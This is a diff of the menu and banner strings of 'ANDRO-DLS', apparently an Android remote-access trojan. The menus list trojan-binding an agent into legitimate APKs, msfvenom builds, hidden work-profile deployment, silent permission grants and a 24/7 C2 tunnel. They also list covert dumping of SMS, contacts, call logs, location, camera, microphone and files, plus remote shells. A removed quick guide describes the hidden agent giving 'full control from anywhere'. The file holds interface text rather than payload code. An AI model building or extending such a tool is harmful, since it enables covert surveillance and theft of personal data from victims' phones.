@@ -3,123 +3,101 @@
 
 version = "v3.0.0"
 
-menu1 = """
-    [bold yellow]── ANDRO-DLS · PHONE CONTROL ───────────────────────────────────[/bold yellow]
-
-    [white]1.[/white] [green]▸ USB SETUP[/green]              [dim]cable connect → tcpip 5555 → wireless[/dim]
-    [white]2.[/white] [green]▸ CONNECTED DEVICES[/green]     [dim]see all · reconnect · manage[/dim]
-    [white]3.[/white] [green]▸ BUILD AGENT[/green]           [dim]pure / enhanced / trojan bind[/dim]
-
-    [dim]0. Exit          keeper: tunnel+listener 24/7 in background[/dim]
-"""
-
-menu2 = """
-    [bold cyan]── CONNECTED DEVICES ───────────────────────────────────────────[/bold cyan]
-
-    [white]1.[/white] [green]▸ LIST ALL DEVICES[/green]       [dim]USB + WiFi + saved[/dim]
-    [white]2.[/white] [green]▸ CONNECT TO DEVICE[/green]     [dim]pick device → connect[/dim]
-    [white]3.[/white] [green]▸ RECONNECT LAST[/green]        [dim]quick reconnect to last device[/dim]
-    [white]4.[/white] [green]▸ DEVICE INFO[/green]           [dim]model, Android ver, IP, battery[/dim]
-    [white]5.[/white] [green]▸ PULL APKs[/green]             [dim]extract all installed apps[/dim]
-    [white]6.[/white] [green]▸ GRANT PERMISSIONS[/green]     [dim]silent grant all runtime perms[/dim]
-
-    [dim]99. Back to Main Menu[/dim]
-"""
-
-menu3 = """
-    [bold magenta]── BUILD AGENT ───────────────────────────────────────────────[/bold magenta]
-
-    [white]1.[/white] [green]▸ PURE BUILD[/green]            [dim]no msfvenom · most stealthy[/dim]
-    [white]2.[/white] [green]▸ ENHANCED BUILD[/green]        [dim]msfvenom base + 6-layer injection[/dim]
-    [white]3.[/white] [green]▸ TROJAN BIND[/green]           [dim]inject agent into legit APK[/dim]
-    [white]4.[/white] [green]▸ WORK PROFILE DEPLOY[/green]   [dim]hidden profile · cross-resurrection[/dim]
-    [white]5.[/white] [green]▸ DEPLOY TO DEVICE[/green]      [dim]install + grant perms + launch[/dim]
-
-    [dim]99. Back to Main Menu[/dim]
-"""
-
-menu4 = """
-    [bold red]── C2 & TUNNEL ─────────────────────────────────────────────────[/bold red]
-
-    [white]1.[/white] [green]▸ START KEEPER[/green]          [dim]24/7 listener + tunnel[/dim]
-    [white]2.[/white] [green]▸ CLOUDFLARE TUNNEL[/green]     [dim]international routing · no port fwd[/dim]
-    [white]3.[/white] [green]▸ PORTMAP TUNNEL[/green]        [dim]legacy portmap.io tunnel[/dim]
-    [white]4.[/white] [green]▸ KEEPER STATUS[/green]         [dim]check sessions + connections[/dim]
-
-    [dim]99. Back to Main Menu[/dim]
-"""
-
-menu5 = """
-    [bold blue]── DATA ACCESS ─────────────────────────────────────────────────[/bold blue]
-
-    [white]1.[/white] [green]▸ SCREENSHOT[/green]            [dim]capture screen[/dim]
-    [white]2.[/white] [green]▸ SCREEN RECORD[/green]         [dim]record screen[/dim]
-    [white]3.[/white] [green] SMS DUMP[/green]              [dim]read all SMS messages[/dim]
-    [white]4.[/white] [green]▸ CONTACTS DUMP[/green]         [dim]read all contacts[/dim]
-    [white]5.[/white] [green]▸ CALL LOGS[/green]             [dim]read call history[/dim]
-    [white]6.[/white] [green]▸ LOCATION[/green]              [dim]get GPS location[/dim]
-    [white]7.[/white] [green]▸ CAMERA[/green]                [dim]launch camera / live view[/dim]
-    [white]8.[/white] [green]▸ MICROPHONE[/green]            [dim]record audio[/dim]
-    [white]9.[/white] [green]▸ FILE BROWSER[/green]          [dim]browse /sdcard/ · pull files[/dim]
-    [white]10.[/white] [green]▸ APP LIST[/green]             [dim]list all installed apps[/dim]
-    [white]11.[/white] [green]▸ SYSTEM INFO[/green]          [dim]device info · battery · network[/dim]
-    [white]12.[/white] [green]▸ SEND SMS[/green]             [dim]send SMS from device[/dim]
-    [white]13.[/white] [green]▸ OPEN URL[/green]             [dim]open URL on device[/dim]
-
-    [dim]99. Back to Main Menu[/dim]
-"""
-
-menu6 = """
-    [bold green]── SHELL ACCESS ────────────────────────────────────────────────[/bold green]
-
-    [white]1.[/white] [green] INTERACTIVE SHELL[/green]     [dim]direct shell on device[/dim]
-    [white]2.[/white] [green]▸ KEEPER SHELL[/green]          [dim]shell via C2 tunnel[/dim]
-    [white]3.[/white] [green]▸ RUN COMMAND[/green]           [dim]one-shot command[/dim]
-    [white]4.[/white] [green]▸ MIRROR SCREEN[/green]         [dim]scrcpy live mirror + control[/dim]
-
-    [dim]99. Back to Main Menu[/dim]
-"""
-
-menu = [menu1, menu2, menu3, menu4, menu5, menu6]
+# ─── Banner ──────────────────────────────────────────────────────────────
 
 banner = """
-     /  _  \   ____    __| _/______  ____             __| _/|  |   ______
-    /  /_\  \ /    \  / __ |\_  __ \/  _ \   ______  / __ | |  |  /  ___/
-   /    |    \   |  \/ /_/ | |  | \(  <_> ) /_____/ / /_/ | |  |__\___ \\
-   \____|__  /___|  /\____ | |__|   \____/          \____ | |____/____  >
-           \/     \/      \/                             \/           \/
-
-
-            [red]{version}[/red]                [white]By Khurshid Jhon & Dls-geek Team[/white]
+╔═══════════════════════════════════════════════════════════════╗
+║                                                               ║
+    █████╗ ██╗  ██╗ ██████╗ ██╗   ██╗██╗███╗   ██╗███████╗    ║
+   ██╔══██╗██║  ██║██╔═══██╗██║   ██║██║████╗  ██║██════╝    ║
+   ███████║███████║██║   ██║██║   ██║██║██╔██╗ ██║█████╗      ║
+   ██══██║╚════██║██║   ██║╚██╗ ██╔╝██║██║╚██╗██║██╔══╝      ║
+   ██║  ██║     ██║██████╔╝ ╚████╝ ██║██║ ████║███████╗     ║
+   ╚═╝  ╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚═╝╚═╝  ╚═══╝══════╝    ║
+   ║                                                               ║
+            {version}  │  By Khurshid Jhon & Dls-geek Team        ║
+   ╚═══════════════════════════════════════════════════════════════╝
 """.format(version=version)
 
 banner_list = [banner]
 
-instructions_banner = """[cyan]
-        ╔══════════════════════════════════════════════════════════╗
-        ║              ANDRO-DLS · QUICK GUIDE                    
-        ╠══════════════════════════════════════════════════════════╣
-        ║  Step 1: USB SETUP (Option 1)                          ║
-        ║    → Connect phone via USB cable                       ║
-        ║    → Enable USB debugging on phone                     ║
-            → Tool switches phone to wireless ADB               
-        ║    → Remove cable — everything works over WiFi now     ║
-        ║                                                        
-        ║  Step 2: CONNECTED DEVICES (Option 2)                  ║
-        ║    → See all connected devices                         ║
-        ║    → Pick device → connect                             ║
-        ║    → Pull APKs, grant permissions, manage              ║
-        ║                                                        ║
-        ║  Step 3: BUILD AGENT (Option 3)                        ║
-        ║    → Pure / Enhanced / Trojan Bind                     ║
-        ║    → Deploy to device → agent runs hidden              ║
-        ║                                                        ║
-        ║  Step 4: C2 & TUNNEL (after deploy)                    ║
-        ║    → Start keeper → Cloudflare tunnel                  ║
-        ║    → Agent connects → full control from anywhere       ║
-        ║                                                        ║
-        ║  Step 5: DATA ACCESS                                   ║
-        ║    → Screenshots, SMS, contacts, camera, mic, location ║
-        ║    → All over C2 tunnel — any network, any country     ║
-        ╚══════════════════════════════════════════════════════════╝
-[/cyan]"""
+# ─── Menus ──────────────────────────────────────────────────────────────
+
+menu1 = """
+    [bold white]── ANDRO-DLS · PHONE CONTROL ─────────────────────────────────[/bold white]
+
+    [dim]1.[/dim] [white]USB SETUP[/white]              [dim]cable → tcpip 5555 → wireless[/dim]
+    [dim]2.[/dim] [white]CONNECTED DEVICES[/white]     [dim]see all · reconnect · manage[/dim]
+    [dim]3.[/dim] [white]BUILD AGENT[/white]           [dim]pure / enhanced / trojan bind[/dim]
+
+    [dim]0. Exit          keeper: tunnel+listener 24/7[/dim]
+"""
+
+menu2 = """
+    [bold white]── CONNECTED DEVICES ────────────────────────────────────────[/bold white]
+
+    [dim]1.[/dim] [white]LIST ALL DEVICES[/white]       [dim]USB + WiFi + saved[/dim]
+    [dim]2.[/dim] [white]CONNECT TO DEVICE[/white]     [dim]pick device → connect[/dim]
+    [dim]3.[/dim] [white]RECONNECT LAST[/white]        [dim]quick reconnect[/dim]
+    [dim]4.[/dim] [white]DEVICE INFO[/white]           [dim]model, Android, IP, battery[/dim]
+    [dim]5.[/dim] [white]PULL APKs[/white]             [dim]extract all installed apps[/dim]
+    [dim]6.[/dim] [white]GRANT PERMISSIONS[/white]     [dim]silent grant all perms[/dim]
+
+    [dim]99. Back to Main[/dim]
+"""
+
+menu3 = """
+    [bold white]── BUILD AGENT ──────────────────────────────────────────────[/bold white]
+
+    [dim]1.[/dim] [white]PURE BUILD[/white]            [dim]no msfvenom · stealthy[/dim]
+    [dim]2.[/dim] [white]ENHANCED BUILD[/white]        [dim]msfvenom + 6-layer[/dim]
+    [dim]3.[/dim] [white]TROJAN BIND[/white]           [dim]inject into legit APK[/dim]
+    [dim]4.[/dim] [white]WORK PROFILE DEPLOY[/white]   [dim]hidden profile[/dim]
+    [dim]5.[/dim] [white]DEPLOY TO DEVICE[/white]      [dim]install + perms + launch[/dim]
+
+    [dim]99. Back to Main[/dim]
+"""
+
+menu4 = """
+    [bold white]── C2 & TUNNEL ──────────────────────────────────────────────[/bold white]
+
+    [dim]1.[/dim] [white]START KEEPER[/white]          [dim]24/7 listener + tunnel[/dim]
+    [dim]2.[/dim] [white]CLOUDFLARE TUNNEL[/white]     [dim]international routing[/dim]
+    [dim]3.[/dim] [white]PORTMAP TUNNEL[/white]        [dim]legacy portmap.io[/dim]
+    [dim]4.[/dim] [white]KEEPER STATUS[/white]         [dim]sessions + connections[/dim]
+
+    [dim]99. Back to Main[/dim]
+"""
+
+menu5 = """
+    [bold white]── DATA ACCESS ──────────────────────────────────────────────[/bold white]
+
+    [dim]1.[/dim] [white]SCREENSHOT[/white]            [dim]capture screen[/dim]
+    [dim]2.[/dim] [white]SCREEN RECORD[/white]         [dim]record screen[/dim]
+    [dim]3.[/dim] [white]SMS DUMP[/white]              [dim]read all SMS[/dim]
+    [dim]4.[/dim] [white]CONTACTS DUMP[/white]         [dim]read all contacts[/dim]
+    [dim]5.[/dim] [white]CALL LOGS[/white]             [dim]read call history[/dim]
+    [dim]6.[/dim] [white]LOCATION[/white]              [dim]get GPS location[/dim]
+    [dim]7.[/dim] [white]CAMERA[/white]                [dim]launch / live view[/dim]
+    [dim]8.[/dim] [white]MICROPHONE[/white]            [dim]record audio[/dim]
+    [dim]9.[/dim] [white]FILE BROWSER[/white]          [dim]browse /sdcard/[/dim]
+    [dim]10.[/dim] [white]APP LIST[/white]             [dim]list installed apps[/dim]
+    [dim]11.[/dim] [white]SYSTEM INFO[/white]          [dim]device info · battery[/dim]
+    [dim]12.[/dim] [white]SEND SMS[/white]             [dim]send SMS from device[/dim]
+    [dim]13.[/dim] [white]OPEN URL[/white]             [dim]open URL on device[/dim]
+
+    [dim]99. Back to Main[/dim]
+"""
+
+menu6 = """
+    [bold white]── SHELL ACCESS ─────────────────────────────────────────────[/bold white]
+
+    [dim]1.[/dim] [white]INTERACTIVE SHELL[/white]     [dim]direct shell on device[/dim]
+    [dim]2.[/dim] [white]KEEPER SHELL[/white]          [dim]shell via C2 tunnel[/dim]
+    [dim]3.[/dim] [white]RUN COMMAND[/white]           [dim]one-shot command[/dim]
+    [dim]4.[/dim] [white]MIRROR SCREEN[/white]         [dim]scrcpy live mirror[/dim]
+
+    [dim]99. Back to Main[/dim]
+"""
+
+menu = [menu1, menu2, menu3, menu4, menu5, menu6]
